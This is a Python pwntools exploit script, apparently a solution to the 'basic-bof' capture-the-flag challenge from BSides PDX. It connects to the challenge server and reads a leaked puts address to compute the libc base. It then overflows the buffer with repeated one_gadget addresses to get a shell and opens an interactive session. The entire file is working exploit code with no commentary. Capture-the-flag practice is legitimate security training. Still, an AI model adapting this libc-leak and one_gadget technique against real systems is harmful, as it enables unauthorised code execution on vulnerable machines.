from pwn import *
import os, sys
#io = process('./basic-bof')
io = remote('basic-bof-2.bsidespdxctf.party', 9999)

context(arch = "amd64")
libc = ELF("libc-2.27.so")
elf = ELF("./basic-bof")

leak = int(io.recvline().decode().split("but there is ")[1].split(".")[0], 16)
base = leak - libc.symbols["puts"]
one_gadget = 0x4f365

payload = p64(base + one_gadget) * 8
log.info(payload)

io.sendline(payload)
io.interactive()



        
